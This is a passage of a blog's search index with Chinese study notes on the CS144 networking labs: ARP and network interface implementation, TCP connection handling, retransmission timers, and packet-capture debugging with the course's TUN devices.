<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Welcome</title>
    <url>/2020/05/Welcome/</url>
    <content><![CDATA[<h2 id="Welcome-to-Kiprey’s-Blog">Welcome to Kiprey’s Blog.</h2>
<h2 id="Just-enjoy-it">Just enjoy it. :)</h2>
<p><strong>水的不行的 learning list：<a href="https://github.com/kiprey/skr_Learning" target="_blank" rel="noopener">github repo</a></strong></p>
<a id="more"></a>
]]></content>
  </entry>
  <entry>
    <title>CS144计算机网络 Lab6</title>
    <url>/2021/11/cs144-lab6/</url>
    <content><![CDATA[<h2 id="一、简介">一、简介</h2>
<p>这里记录了笔者学习 CS144 计算机网络 Lab6 的一些笔记 - <strong>IP Router 路由器</strong> 的实现</p>
<p>CS144 Lab5 实验指导书 - <a href="https://cs144.github.io/assignments/lab6.pdf" target="_blank" rel="noopener">Lab Checkpoint 6: building an IP router</a></p>
<p>个人 CS144 实验项目地址 - <a href="https://github.com/Kiprey/sponge" target="_blank" rel="noopener">github</a></p>
<a id="more"></a>
<h2 id="二、环境配置">二、环境配置</h2>
<p>当前我们的实验代码位于 <code>master</code> 分支，而在完成 Lab 之前需要合并一些依赖代码，因此执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git merge origin/lab6-startercode</span><br></pre></td></tr></table></figure>
<p>之后重新 make 编译即可。</p>
<h2 id="三、">三、</h2>
]]></content>
      <tags>
        <tag>计算机网络</tag>
        <tag>CS144</tag>
      </tags>
  </entry>
  <entry>
    <title>CS144计算机网络 Lab5</title>
    <url>/2021/11/cs144-lab5/</url>
    <content><![CDATA[<h2 id="一、简介">一、简介</h2>
<p>这里记录了笔者学习 CS144 计算机网络 Lab5 的一些笔记 - <strong>网络接口 network interface（也被称为适配器）</strong> 的实现</p>
<p>CS144 Lab5 实验指导书 - <a href="https://cs144.github.io/assignments/lab5.pdf" target="_blank" rel="noopener">Lab Checkpoint 5: down the stack (the network interface)</a></p>
<p>个人 CS144 实验项目地址 - <a href="https://github.com/Kiprey/sponge" target="_blank" rel="noopener">github</a></p>
<a id="more"></a>
<h2 id="二、环境配置">二、环境配置</h2>
<p>当前我们的实验代码位于 <code>master</code> 分支，而在完成 Lab 之前需要合并一些依赖代码，因此执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git merge origin/lab5-startercode</span><br></pre></td></tr></table></figure>
<p>之后重新 make 编译即可。</p>
<h2 id="三、TCP报文的数据传输方式">三、TCP报文的数据传输方式</h2>
<p>TCP报文有三种方式可被传送至远程服务器，分别是：</p>
<ul>
<li>
<p><strong>TCP</strong>-in-UDP-in-IP：用户提供 TCP 包，之后可以使用 Linux 提供的接口，让内核来负责构造 UDP 报头、IP报头以及以太网报头，并将构造出的数据包发送至下一个层。因为这一切都是内核完成的任务，因此内核可以确保每个套接字都具有<strong>本地地址与端口，以及远程地址与端口的唯一组合</strong>，同时能保证不同进程之前的隔离。</p>
</li>
<li>
<p><strong>TCP-in-IP</strong>：通常，TCP数据包是直接放进 IP 包作为其 payload，这也因此被称为 TCP/IP。但用户层如果想直接操作构造 IP 报文的话，需要使用到 <strong>Linux 提供的 TUN 虚拟网络设备</strong>来作为中转。当用户将 IP 报文发送给 TUN 设备后，剩余的以太网报头构造、发送以太网帧等等的操作均会由内核自动进行，无需用户干预。</p>
<blockquote>
<p>这一个正是之前 Lab4 中 CS144 所使用的机制，感兴趣可以仔细读读代码。</p>
</blockquote>
</li>
<li>
<p><strong>TCP-in-IP-in-Ethernet</strong>：上面两种方式仍然依赖Linux内核来实现的协议栈操作。每次用户向TUN设备写入IP数据报时，Linux 内核都必须构造一个适当的链路层(以太网)帧，并将IP数据报作为其 payload。因此 Linux 必须找出下一跳的以太网目的地址，给出下一跳的IP地址。如果 Linux 无法得知该映射关系，则将会发出广播探测请求以查找到下一跳的地址等信息。而这种功能是由<strong>网络接口 network interface</strong> （也被称为<strong>适配器</strong>，两者等价）所实现，它将会把<strong>待出口的 IP 报文</strong>转换成链路层（以太网）帧等等，之后将链路层帧发送给 <strong>TAP 虚拟网络设备</strong>，剩下的发送操作将会由它来代为完成。</p>
<blockquote>
<p>比较熟悉的网络接口分别是 eth0, eth1, whan0 等等。</p>
</blockquote>
<p>网络接口的大部分工作是：<strong>为每个下一跳IP地址查找(和缓存)以太网地址</strong>。而这种协议被称为<strong>地址解析协议ARP</strong>。</p>
<p>在本实验中，我们将会完成一个这样的网络接口实现（有点小期待）。</p>
</li>
</ul>
<h2 id="四、地址解析协议-ARP">四、地址解析协议 ARP</h2>
<p>在编写代码前，我们需要简单的了解一下 ARP 协议。</p>
<p>主机或路由器不具有链路层地址，而是它们的适配器（即网络接口）具有链路层地址。链路层地址通常称为 <strong>MAC 地址</strong>。当某个适配器要向某些目的适配器发送一个帧时，发送适配器将目的适配器的 MAC 地址插入至该帧中，并将该帧发送到局域网上。一块适配器可能因为广播操作，接收到了一个并非向它寻址的帧，因此当适配器接收到一个帧时，将检查并丢弃<strong>帧的目的MAC地址不与自己MAC地址匹配</strong>的以太网帧。</p>
<p>为什么适配器除了有**网络层地址（IP地址）<strong>以外，还会有</strong>链路层地址（MAC地址）**呢？有两个原因：</p>
<ul>
<li>局域网是为了<strong>任意</strong>网络层协议而设计，并非只用于 IP 和因特网。</li>
<li>如果适配器使用 IP地址而不使用 MAC 地址，那么每次适配器移动或重启时，<strong>均需重新配置地址</strong>。</li>
</ul>
<p>由于适配器同时拥有网络层和链路层地址，因此需要相互转化。而这种转换的任务就由 <strong>地址解析协议</strong> 来完成。ARP 类似于 DNS 服务，但不同的是，DNS 为<strong>任何地方的主机</strong>来解析主机名，但 ARP 只能为<strong>在同一个子网上的主机和路由器接口</strong>解析 IP 地址。</p>
<p>每台主机或路由器在其内存中保存了一张 ARP 表，该表包含了 IP 地址到 MAC 地址的映射关系，同时还包含了一个寿命值（TTL），用以表示从表中删除每个映射的时间，例如：</p>
<table>
<thead>
<tr>
<th style="text-align:center">IP 地址</th>
<th style="text-align:center">MAC 地址</th>
<th style="text-align:center">TTL</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">222.222.222.221</td>
<td style="text-align:center">aa-bb-cc-dd-ee-ff</td>
<td style="text-align:center">13:45:00</td>
</tr>
<tr>
<td style="text-align:center">222.222.222.223</td>
<td style="text-align:center">11-22-33-44-55-66</td>
<td style="text-align:center">4:34:12</td>
</tr>
<tr>
<td style="text-align:center">…</td>
<td style="text-align:center">…</td>
<td style="text-align:center">…</td>
</tr>
</tbody>
</table>
<p>若 ARP 表中已经存放了目标 IP 地址的 MAC 地址映射，那么适配器将会很容易的找出目标 MAC 地址并构造一个以太网帧。但如果找不到，那么发送方将会构造一个 <strong>ARP 分组</strong>的特殊分组。</p>
<p>ARP 分组中的字段包括<strong>发送和接收 IP 地址以及 MAC 地址</strong>，同时 ARP 查询分组和<strong>响应分组</strong>都具有相同的格式。ARP 查询分组的目的是询问子网上所有其他主机和路由器，以确定对应于要解析的 IP 地址的那个 MAC 地址。</p>
<p>当发送适配器需要查询目的适配器的 MAC 地址时，发送适配器会设置分组的目的地址为 <strong>MAC 广播地址（FF-FF-FF-FF-FF-FF）</strong>，这样做的目的是为了让<strong>所有</strong>子网上的其他适配器都接收到。当其他适配器接收到了该 ARP 查询分组后，<strong>只有 IP 匹配的适配器</strong>才会返回一个 ARP 响应分组，之后发送适配器便可更新自己的 ARP 表，并开始发送 IP 报文。</p>
<p>查询ARP报文是在<strong>广播帧</strong>中发送，而响应ARP报文只在一个<strong>标准帧</strong>中发送。同时 ARP 表是自动建立的，无需人为设置。若主机与子网断开连接，那么该节点留在其他节点的 ARP 表中对应的条目也会被自动删除。</p>
<p>与之相对的，<strong>ARP欺骗攻击</strong>可以利用 <strong>ARP 协议不提供对网络上的 ARP 回复进行身份验证</strong> 这样的一个缺陷，来轻易执行中间人攻击或者 DOS 攻击。</p>
<blockquote>
<p>其他详细信息可以看看 <a href="https://datatracker.ietf.org/doc/html/rfc826" target="_blank" rel="noopener">RFC826</a> 规范。</p>
</blockquote>
<h2 id="五、Network-Interface-具体实现">五、Network Interface 具体实现</h2>
<p>首先， 我们需要额外设置三个数据结构，分别是：</p>
<ul>
<li>
<p><code>_arp_table</code>：ARP 表，用以查询 IP至MAC地址的映射，同时还保存当前 ARP 条目的 TTL。</p>
<blockquote>
<p>ARP条目 TTL 为 30s。</p>
</blockquote>
</li>
<li>
<p><code>_waiting_arp_response_ip_addr</code>：已经发送了的 ARP 报文。必须确保每个 ARP 报文在<strong>5秒</strong>内不重复发送。</p>
</li>
<li>
<p><code>_waiting_arp_internet_datagrams</code>：这里存放着<strong>等待ARP返回报文</strong>的 IP 报文。只有对应 ARP 返回报文到来，更新了 ARP 表后，网络接口才会知道这些 IP 报文要发送至哪个 MAC 地址。</p>
</li>
</ul>
<p>在实现整个网络接口时，必须确保几点</p>
<ul>
<li><strong>ARP条目 TTL 为30s</strong>，时间到期后需要将其从 ARP Table 中删除。</li>
<li>若发送 IP 报文时，发现 ARP Table 中无目标 MAC 地址，则立即发送 ARP 请求报文，同时将当前 IP 报文暂时缓存，直至获取到目标 MAC 地址后再重新发送。</li>
<li><strong>不同目标 IP 的 ARP 请求报文</strong>之间的发送间隔，<strong>不能超过 5s</strong>。</li>
<li>如果 ARP 请求报文在 5 秒内仍然无响应，则<strong>重新发送</strong>。</li>
<li>当网络接口接收到一个以太网帧时，
<ul>
<li>必须丢弃目的 MAC 地址不为当前网络接口 MAC 地址</li>
<li>除了 ARP 协议需要比较自己的 IP 地址以外，<strong>不要在其他任何地方进行 IP 比较</strong>，因为网络接口位于链路层。</li>
<li>如果是发给自己的 ARP 请求，那么要忽略掉发送来的 <strong>ARPMessage::target_ethernet_address</strong>，因为发送者自己也不知道这个要填写什么，该字段无意义。</li>
<li>无论接收到的是 <strong>ARP 请求包或者 ARP 响应包</strong>，只要是<strong>明确发给自己</strong>的，那么这里面的 src_ip_addr 和 src_eth_addr 都可用于更新当前的 ARP 表。</li>
</ul>
</li>
</ul>
<p>具体代码可以看这里：</p>
<ul>
<li><a href="https://github.com/kiprey/sponge/blob/master/libsponge/network_interface.cc" target="_blank" rel="noopener">network_interface.cc</a></li>
<li><a href="https://github.com/kiprey/sponge/blob/master/libsponge/network_interface.hh" target="_blank" rel="noopener">network_interface.hh</a></li>
</ul>
<p>测试结果：</p>
<p><img src="/2021/11/cs144-lab5/image-20211118164207822.png" alt="image-20211118164207822"></p>
]]></content>
      <tags>
        <tag>计算机网络</tag>
        <tag>CS144</tag>
      </tags>
  </entry>
  <entry>
    <title>CS144计算机网络 Lab4</title>
    <url>/2021/11/cs144-lab4/</url>
    <content><![CDATA[<h2 id="一、简介">一、简介</h2>
<p>这里记录了笔者学习 CS144 计算机网络 Lab4 的一些笔记 - TCP 总实现 TCPConnection</p>
<p>CS144 Lab4 实验指导书 - <a href="https://cs144.github.io/assignments/lab4.pdf" target="_blank" rel="noopener">Lab Checkpoint 4: the summit (TCP in full)</a></p>
<p>个人 CS144 实验项目地址 - <a href="https://github.com/Kiprey/sponge" target="_blank" rel="noopener">github</a></p>
<a id="more"></a>
<h2 id="二、环境配置">二、环境配置</h2>
<p>当前我们的实验代码位于 <code>master</code> 分支，而在完成 Lab 之前需要合并一些依赖代码，因此执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git merge origin/lab4-startercode</span><br></pre></td></tr></table></figure>
<p>之后重新 make 编译即可。</p>
<h2 id="三、TCPConnection-简述">三、TCPConnection 简述</h2>
<p>TCPConnection 需要将 TCPSender 和 TCPReceiver 结合，实现成一个 TCP 终端，同时收发数据。</p>
<p>TCPConnection 有几个规则需要遵守：</p>
<p>对于<strong>接收数据段</strong>而言：</p>
<ul>
<li>
<p>如果接收到的数据包设置了 RST 标志，则将输入输出字节流全部设置为 错误 状态，并永久关闭 TCP 连接。</p>
</li>
<li>
<p>如果没有收到 RST 标志，则将该数据包传达给 TCPReceiver 来处理，它将对数据包中的 seqno、SYN、payload、FIN 进行处理。</p>
</li>
<li>
<p>如果接收到的数据包中设置了 ACK 标志，则向<strong>当前 TCPConnection</strong> 中<strong>它自己的 TCPSender</strong> 告知远程终端的 ackno 和 window_size。</p>
<blockquote>
<p>这一步相当重要，因为数据包在网络中以乱序形式发送，因此远程发送给本地的 ackno 存在滞后性。</p>
<p>将远程的 ackno 和 window size 附加至发送数据中可以降低这种滞后性，提高 TCP 效率。</p>
</blockquote>
</li>
<li>
<p>如果接收到的 TCP 数据包包含了一个<strong>有效 seqno</strong>，则 TCPConnection 必须至少返回一个 TCP 包作为回复，以告知远程终端 此时的 ackno 和 window size。</p>
</li>
<li>
<p>如果接收到的 TCP 数据包<strong>包含的 seqno 是无效</strong>的，则 TCPConnection 也需要回复一个类似的无效数据包。这是因为远程终端可能会发送无效数据包以确认当前连接是否有效，同时查看此时接收方的 ackno 和 window size。这被称为 TCP 的 <code>keep-alive</code>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (_receiver.ackno().has_value() &amp;&amp; seg.length_in_sequence_space() == <span class="number">0</span> &amp;&amp; seg.header().seqno == _receiver.ackno().value() - <span class="number">1</span>) &#123;</span><br><span class="line">  _sender.send_empty_segment();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>对于<strong>发送数据段</strong>来说：</p>
<ul>
<li>当 TCPSender 将一个 TCPSegment 数据包添加到待发送队列中时，TCPConnection 需要从中取出并将其发送。</li>
<li>在发送当前数据包之前，TCPConnection 会获取当前<strong>它自己的 TCPReceiver</strong> 的 ackno 和 window size，将其放置进待发送 TCPSegment 中，并设置其 ACK 标志。</li>
</ul>
<p>TCPConnection 需要检测时间的流逝。它存在一个 tick 函数，该函数将会被操作系统持续调用。当 TCPConnection 的 tick 函数被调用后，它需要</p>
<ul>
<li>告知 TCPSender 时间的流逝，这可能会让 TCPSender 重新发送被丢弃的数据包</li>
<li>如果连续重传次数超过 <code>TCPConfig::MAX RETX ATTEMPTS</code>，则发送一个 RST 包。</li>
<li>在条件适合的情况下关闭 TCP 连接（当处于 TCP 的 TIME_WAIT 状态时）。</li>
</ul>
<p>TCP 连接的关闭稍微麻烦一些，主要有以下几种情况需要考虑：</p>
<ul>
<li>
<p><strong>接收方收到 RST 标志或者发送方发送 RST 标志</strong>后，设置当前 TCPConnection 的输入输出字节流的状态为错误状态，并<strong>立即</strong>停止退出。这种属于暴力退出（unclear shutdown），可能会导致<strong>尚未传输完成的数据丢失</strong>（例如仍然在网络中运输的数据包在<strong>接收方收到RST标志后</strong>被丢弃）。</p>
</li>
<li>
<p>若想让双方都在数据流收发完整后退出（clear shutdonw），则情况略微麻烦一点。先上张四次挥手的图：</p>
<p><img src="/2021/11/cs144-lab4/image-20210515092825158.png" alt="img"></p>
<p>简单讲下挥手的流程：</p>
<ul>
<li>
<p>当<strong>客户端</strong>的数据全部发送完成，则将会发送 FIN 包以告知服务器 <strong>客户端数据全部发送完成</strong>（发送完成，不等于<strong>被接收完成</strong>）。但请注意，此时的服务器仍然可以发送数据至客户端。</p>
</li>
<li>
<p>当服务器对 客户端的 FIN 进行 ack 后，则说明<strong>服务器确认接收客户端的全部数据</strong>。</p>
</li>
<li>
<p>服务器继续发送数据，直到服务器的数据已经全部发送完成，则向客户端发送 FIN 包以告知<strong>服务端数据全部发送完成</strong>。</p>
</li>
<li>
<p>当客户端对服务端的 FIN <strong>发送</strong> ack 后，则说明<strong>客户端确认接收服务端的全部数据</strong>。注意，此时客户端可以确认：</p>
<ul>
<li><strong>服务端</strong>成功接收<strong>客户端</strong>全部数据</li>
<li><strong>客户端</strong>成功接收<strong>服务端</strong>的全部数据</li>
</ul>
<p>此时客户端可以百分百相信，<strong>此时断开连接对客户端是没有任何危害的</strong>。</p>
<p>但是！当服务器没接收到 客户端的 ACK 时，</p>
<ul>
<li>服务器可以确认它成功接收客户端全部数据</li>
<li>服务器<strong>不知道客户端是否成功接收服务端的全部数据</strong></li>
</ul>
<p>也就是说，服务器一定要获得到客户端的 ACK 才能关闭。</p>
<p>若服务器在超时时间内没获得到客户端的 FIN ACK，则会重发 FIN 包。但假如此时客户端已经断连，那么服务器将<strong>永远无法获取到客户端的 FIN ACK</strong>。因此即便客户端已经完成了它的所有任务，它仍然需要等待服务器端一小段时间，以便于处理服务端的 FIN 包。</p>
<p>当服务器获取到了客户端的 FIN_ACK 后，它就直接关闭连接。而客户端也会在超时后静默关闭。此时双方均成功获取对方的全部数据，没有造成任何危害。</p>
<blockquote>
<p>这里有个很重要的点是，<strong>TCP 不会对 ACK 包来进行 ACK</strong>。例如服务端不会对客户端发来的 FIN_ACK 回复一个 FIN_ACK_ACK。</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h2 id="四、TCP-状态图">四、TCP 状态图</h2>
<p>这里放两张TCP 双方的状态图，做完这些实验再去看它们就相当轻松了：</p>
<p><img src="/2021/11/cs144-lab4/20180328001537836.jpg" alt="这里写图片描述"></p>
<p><img src="/2021/11/cs144-lab4/20180328001111303.jpg" alt="这里写图片描述"></p>
<h2 id="五、调试">五、调试</h2>
<p>测试样例的调试我就不多说了，因为这部分已经在之前说了，直接用 gdb 起一个会话然后单步调试就好，比较简单。这里记录一下 CS144 模拟网卡的调试方式。</p>
<p>首先是启动一个 wireshark 会话抓包，这里有两种方式，一种是终端抓包：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo tshark -Pw /tmp/debug.raw -i tun144</span><br></pre></td></tr></table></figure>
<p>效果是这样的：</p>
<p><img src="/2021/11/cs144-lab4/image-20211115175444352.png" alt="image-20211115175444352"></p>
<p>而且抓到的数据包存放于 /tmp/debug.raw 中，也便于后期分析。</p>
<p>不过对我个人而言还是更喜欢图形界面，因此键入以下命令:</p>
<blockquote>
<p>注意一定要用 sudo ！不然找不到网卡。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo wireshark</span><br></pre></td></tr></table></figure>
<p>然后在 tun144 和 145 中随意选一个，没区别。这里我选了 tun144。</p>
<blockquote>
<p>tun144 和 145 是 CS144 模拟出的两个虚拟网卡。这两张网卡可以互通。</p>
</blockquote>
<p><img src="/2021/11/cs144-lab4/image-20211115175613525.png" alt="image-20211115175613525"></p>
<p>之后分别在<strong>两个</strong>终端下键入命令以相互连接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在 tun144 网段下启动 server 监听，其地址为 169.254.144.9:9090</span></span><br><span class="line">./apps/tcp_ipv4 -l 169.254.144.9 9090</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在 tun145 网段下启动 client，其地址为 169.254.145.9，向 169.254.144.9:9090 发起连接</span></span><br><span class="line">./apps/tcp_ipv4 -d tun145 -a 169.254.145.9 169.254.144.9 9090</span><br></pre></td></tr></table></figure>
<p>之后便可以在 wireshark 中捕获其数据包来往：</p>
<p><img src="/2021/11/cs144-lab4/image-20211115180315678.png" alt="image-20211115180315678"></p>
<p>这是捕获到的错误 TCP 数据包的来往。可以发现在三次握手的时候，Server  貌似没有对 Client 返回的 ACK 进行处理，而是一直重发 SYN+ACK，最后导致重发次数过多被 Server 端挂断连接。</p>
<p>找到了问题便可以通过 gdb 来进行调试。不过在用 gdb 调试时，记得给 <code>./apps/tcp_ipv4</code> 设置个大一点的 <code>-t</code> 数据包超时时间参数，以避免发送方重复发送数据，扰乱捕获数据包的观察。</p>
<p>这个错误折腾了我一个晚上，最后发现貌似是我本机的 Tun/Tap 机制出现了问题，导致 Client 发给 Server 的数据包的 <strong>源 IP 地址不一致</strong>（看捕获到的第一行数据包 <code>169.254.144.1 -&gt; 169.254.144.9</code> 和第三行数据包 <code>169.254.145.9 -&gt; 169.254.144.9</code>）：</p>
<blockquote>
<p>Client 发送的 IP 包头为  <code>169.254.145.9 -&gt; 169.254.144.9</code>。</p>
</blockquote>
<p><img src="/2021/11/cs144-lab4/image-20211115175444352.png" alt="image-20211115175444352"></p>
<p>这会导致 Server 接收到 第三行 ACK 数据包时，认为该数据包不来自 Client，因此将其丢弃，一直等待 ACK 包。</p>
<p>一种临时解决方法是，在<code>libsponge/tcp_helpers/tcp_over_ip.cc</code>中的 <code>TCPOverIPv4Adapter::unwrap_tcp_in_ip</code> 函数中，注释掉一个 check：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">optional&lt;TCPSegment&gt; <span class="title">TCPOverIPv4Adapter::unwrap_tcp_in_ip</span><span class="params">(<span class="keyword">const</span> InternetDatagram &amp;ip_dgram)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// is the IPv4 datagram for us?</span></span><br><span class="line">    <span class="comment">// Note: it's valid to bind to address "0" (INADDR_ANY) and reply from actual address contacted</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">not</span> listening() <span class="keyword">and</span> (ip_dgram.header().dst != config().source.ipv4_numeric())) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//! <span class="doctag">NOTE:</span> 注释该 check</span></span><br><span class="line">    <span class="comment">// is the IPv4 datagram from our peer?</span></span><br><span class="line">    <span class="comment">// if (not listening() and (ip_dgram.header().src != config().destination.ipv4_numeric())) &#123;</span></span><br><span class="line">    <span class="comment">//     return &#123;&#125;;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// does the IPv4 datagram claim that its payload is a TCP segment?</span></span><br><span class="line">    <span class="keyword">if</span> (ip_dgram.header().proto != IPv4Header::PROTO_TCP) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这真是太折腾了…</p>
<h2 id="六、具体实现">六、具体实现</h2>
<p>该实验相当相当的费劲，原因时大量的测试样例会涉及到大量的边界检测，以及最后还会有真实网络连接下的数据包交互。TCPSender 和 TCPReceiver 必须足够鲁棒，才能降低 TCPConnection 的实现难度。</p>
<p>TCPConnection 必须实时根据当前的 TCP 状态来处理传入的数据包，过滤无用数据包，其实现<strong>必须假设输入的 TCPSegment 不可信任</strong>，然后利用大量的 check 来把它慢慢验证为是一个可信的 TCPSegment。</p>
<blockquote>
<p>注意：一定要防止整数溢出攻击！</p>
</blockquote>
<p>这部分实现的相关解释，我以注释的形式写入代码中，结合代码阅读方便理解。整体实现完成其实也没多少代码，因为大部分的操作都可以推迟到具体的 TCPSender、TCPReceiver 来处理（包括里面的异常处理）。</p>
<blockquote>
<p>因此这个实验非常吃前面实验实现的基础代码，非常非常的吃。</p>
<p>而且前面的实验可能也存在一些问题没有被测试样例给检测出来，这次将全部检测出（因为是TCP实验中最后的部分了）。</p>
</blockquote>
<p>代码位于：</p>
<ul>
<li><a href="https://github.com/Kiprey/sponge/blob/master/libsponge/tcp_connection.hh" target="_blank" rel="noopener">tcp_connection.hh</a></li>
<li><a href="https://github.com/Kiprey/sponge/blob/master/libsponge/tcp_connection.cc" target="_blank" rel="noopener">tcp_connection.cc</a></li>
</ul>
<p>测试结果：</p>
<p><img src="/2021/11/cs144-lab4/image-20211116090253846.png" alt="image-20211116090253846"></p>
<p>benchmark:</p>
<p><img src="/2021/11/cs144-lab4/image-20211116090556892.png" alt="image-20211116090556892"></p>
<p>webget 与真实服务器通信：</p>
<p><img src="/2021/11/cs144-lab4/image-20211116105134413.png" alt="image-20211116105134413"></p>
<h2 id="七、CS144-模拟网络传输逻辑">七、CS144 模拟网络传输逻辑</h2>
<p>CS144 中用来模拟两机网络交互的那部分代码很有意思，这里简单的研究了一下 <code>tcp_ipv4.cc</code> 中的完整逻辑。</p>
<p>首先，项目根路径中的 <code>tun.sh</code> 会使用 <code>ip tuntap</code> 技术创建虚拟 Tun/Tap 网络设备。这类接口仅能工作在内核中。不同于普通的网络接口，没有物理硬件。这样做的目的应该是为了模拟真实网络环境下的网络环境。</p>
<blockquote>
<p>这里是 tun/tap 的详细描述 - <a href="https://zhuanlan.zhihu.com/p/260405786" target="_blank" rel="noopener">虚拟设备之TUN和TAP - 知乎</a></p>
</blockquote>
<p>当 Tun/Tap 网络设备建立好后，tcp_ipv4.cc 中会建立一个 <code>TCPOverIPv4OverTunFdAdapter</code>。<code>TunFd</code>指的是连接进 Tun 设备上的 socket，而<code>TCPOverIPv4OverTunFdAdapter</code>是一个 IP 层面的封装接口。当调用 adapter 向其写入 TCP 报文段时，它会自动 wrap 上 IP 段并传输进网络设备中；读取也是亦然，会自动解除 IP 段并返回其内部封装的 TCP报文段。</p>
<p>接下来，无论对于 Server 还是 Client，在三次握手之后，都会建立一个新的线程，来专门执行 <code>LossyTCPOverIPv4SpongeSocket</code> 中的 eventloop。而子线程会另起一个 eventloop 以及另外开辟两个缓冲区，用于存放用户写入的数据与即将输出至屏幕的数据。当用户通过 stdin 输入数据时， <strong>eventloop  中所注册的 poll 事件</strong>被检测到，则数据将会被写入进本地输入缓冲区中。当 <code>TCPOverIPv4OverTunFdAdapter</code> 可写时，它会将本地输入缓冲区中的数据全部写入至 <code>TCPOverIPv4OverTunFdAdapter</code> ，并最终传输至远程。</p>
<p>而 webget 与真实服务器通信的原理，也是通过将 IP 报文写入 tun 虚拟网络设备，将其注入进 OS 协议栈中，模拟实际的发包情况。</p>
<p>以下是 <code>tun.sh</code> 中创建 tun 网络设备的相关命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># start_tun 144</span></span><br><span class="line"><span class="built_in">local</span> TUNNUM=144 TUNDEV=tun144</span><br><span class="line">ip tuntap add mode tun user Kiprey name tun144</span><br><span class="line">ip addr add 169.254.144.1/24 dev tun144</span><br><span class="line">ip link <span class="built_in">set</span> dev tun144 up</span><br><span class="line">ip route change 169.254.144.0/24 dev tun144 rto_min 10ms</span><br><span class="line">iptables -t nat -A PREROUTING -s 169.254.144.0/24 -j CONNMARK --<span class="built_in">set</span>-mark 144</span><br><span class="line">iptables -t nat -A POSTROUTING -j MASQUERADE -m connmark --mark 144</span><br></pre></td></tr></table></figure>
<p>这是一个相当有意思的代码，有空可以读读理解理解。</p>
]]></content>
      <tags>
        <tag>计算机网络</tag>
        <tag>CS144</tag>
      </tags>
  </entry>
  <entry>
    <title>CS144计算机网络 Lab3</title>
    <url>/2021/11/cs144-lab3/</url>
    <content><![CDATA[<h2 id="一、简介">一、简介</h2>
<p>这里记录了笔者学习 CS144 计算机网络 Lab3 的一些笔记 - TCP 发送方实现 TCPSender</p>
<p>CS144 Lab3 实验指导书 - <a href="https://cs144.github.io/assignments/lab3.pdf" target="_blank" rel="noopener">Lab Checkpoint 3: the TCP sender</a></p>
<p>个人 CS144 实验项目地址 - <a href="https://github.com/Kiprey/sponge" target="_blank" rel="noopener">github</a></p>
<a id="more"></a>
<h2 id="二、环境配置">二、环境配置</h2>
<p>当前我们的实验代码位于 <code>master</code> 分支，而在完成 Lab 之前需要合并一些依赖代码，因此执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git merge origin/lab3-startercode</span><br></pre></td></tr></table></figure>
<p>之后重新 make 编译即可。</p>
<h2 id="三、TCPSender-简述">三、TCPSender 简述</h2>
<h3 id="1-TCPSender-功能">1. TCPSender 功能</h3>
<p>TCP Sender 负责将数据以 TCP 报文的形式发送，其需要完成的功能有:</p>
<ul>
<li>将 ByteStream 中的数据以 TCP 报文形式<strong>持续</strong>发送给接收者。</li>
<li>处理 TCPReceiver 传入的 ackno 和 window size，以追踪接收者当前的接收状态，以及检测丢包情况。</li>
<li>若<strong>经过一个超时时间后</strong>仍然<strong>没有接收到 TCPReceiver 发送的针对某个数据包的 ack 包</strong>，则重传对应的原始数据包。</li>
</ul>
<h3 id="2-如何检测丢包">2. 如何检测丢包</h3>
<p>TCP 使用<strong>超时重传机制</strong>。TCPSender 除了将原始数据流分解成众多 TCP 报文并发送以外，它还会追踪每个<strong>已发送报文</strong>（已被发送但还未被接收）的发送时间。如果某些<strong>已发送报文</strong>太久没有被接收方确认（即接收方接收到对应的 ackno），则该数据包必须<strong>重传</strong>。</p>
<p>需要注意的是，<strong>接收方返回的 ackno 并不一定对应着发送方返回的 seqno</strong>（也不和 seqno 有算数关系），这是因为发送的数据可能会因为内存问题，被接收方截断。</p>
<p>接收方确认某个报文，指的是该报文的<strong>所有字节索引</strong>都已被确认。这意味着如果该报文只有<strong>部分被确认</strong>，则不能说明该报文已被完全确认。</p>
<p>TCP 的超时机制比较麻烦，这是因为超时机制直接影响到应用程序从远程服务器上读取数据的响应时间，以及影响到网络拥堵的程度。以下是实现 TCPSender 时需要注意的一些点：</p>
<ul>
<li>
<p>每隔几毫秒，TCPSender的 tick 函数将会被调用，其参数声明了过去的时间。这是 TCPSender 唯一能调用的超时时间相关函数。因为直接调用 clock 或者 time 将会导致测试套件不可用。</p>
</li>
<li>
<p>TCPSender 在构造时会被给予一个<strong>重传超时时间 RTO</strong>的初始值。RTO 是在重新发送未完成 TCP 段之前需要等待的毫秒数。RTO值将会随着时间的流逝（或者更应该说是网络环境的变化）而变化，但<strong>初始的RTO</strong>将始终不变。</p>
</li>
<li>
<p>在 TCPSender 中，我们需要实现一个<strong>重传计时器</strong>。该计时器将会在 RTO 结束时进行一些操作。</p>
</li>
<li>
<p>当每次发送<strong>包含数据</strong>的数据包时，都需要启动重传计时器，并让它在 RTO 毫秒后超时。若所有<strong>发送中报文</strong>均被确认，则终止重传计时器。</p>
</li>
<li>
